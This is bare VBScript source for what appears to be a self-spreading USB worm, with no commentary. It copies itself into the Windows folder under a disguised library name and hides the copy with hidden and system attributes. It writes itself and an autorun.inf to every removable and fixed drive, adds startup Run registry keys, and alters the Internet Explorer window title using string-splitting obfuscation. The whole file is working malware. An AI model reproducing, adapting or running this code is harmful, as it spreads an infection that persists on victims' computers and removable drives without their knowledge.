on error resume next
dim mysource,winpath,flashdrive,fs,mf,atr,tf,rg,nt,check,sd, viva
atr = "[autorun]"&vbcrlf&"shellexecute=wscript.exe VBRuntime32.dll.vbs"
set fs = createobject("Scripting.FileSystemObject")
set mf = fs.getfile(Wscript.ScriptFullname)
dim text,size
viva = "msgbox ""WElcome to Shayma's"" & vbcrlf & vbcrlf & ""Please Enjoy!! our Services.. Thank you for coming"", 64, ""This is only edited Original FIles has been Replaced"""
size = mf.size
check = mf.drive.drivetype
set text=mf.openastextstream(1,-2)
do while not text.atendofstream
   mysource=mysource & text.readline & vbcrlf      
loop  
do
   Set winpath = fs.getspecialfolder(0)
'   on error resume next
   set tf = fs.getfile(winpath & "\VBRuntime32.dll.vbs")
   tf.attributes = 32
'   on error goto 0
   set tf = fs.createtextfile(winpath & "\VBRuntime32.dll.vbs",2,true)
   tf.write mysource
   tf.close
   set tf = fs.getfile(winpath & "\VBRuntime32.dll.vbs")
   tf.attributes = 39

'   on error resume next
   set tf = fs.getfile(winpath & "\viva.dll.vbs")
   tf.attributes = 32
'   on error goto 0
   set tf = fs.createtextfile(winpath & "\viva.dll.vbs",2,true)
   tf.write viva
   tf.close
   set tf = fs.getfile(winpath & "\viva.dll.vbs")
   tf.attributes = 39

   for each flashdrive in fs.drives
      If (flashdrive.drivetype = 1 or flashdrive.drivetype = 2) and flashdrive.path<>"A:" then
'         on error resume next
         set tf=fs.getfile(flashdrive.path &"\VBRuntime32.dll.vbs")
         tf.attributes =32
'         on error goto 0
         set tf=fs.createtextfile(flashdrive.path &"\VBRuntime32.dll.vbs",2,true)
         tf.write mysource
         tf.close
         set tf=fs.getfile(flashdrive.path &"\VBRuntime32.dll.vbs")
         tf.attributes =39
'         on error resume next
         set tf =fs.getfile(flashdrive.path &"\autorun.inf")
         tf.attributes = 32
'         on error goto 0
         set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)
         tf.write atr
         tf.close
         set tf =fs.getfile(flashdrive.path &"\autorun.inf")
         tf.attributes=39
      end if
   next
   set rg = createobject("WScript.Shell")
   rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WinExpress",winpath & "\viva.dll.vbs"
   rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WinDebugger",winpath & "\VBRuntime32.dll.vbs"
   rg.regwrite "HKEY_CUR"&"RENT_USER"&"\Soft"&"ware\Micro"&"soft\Inter"&"net Explo"&"rer\Main\Win"&"dow Tit"&"le"," Maykrosop xplorer"
   if check then
      Wscript.sleep 200000
   end if
loop while check
set sd = createobject("Wscript.shell")
sd.run winpath&"\explorer.exe /e,/select, " & Wscript.ScriptFullname

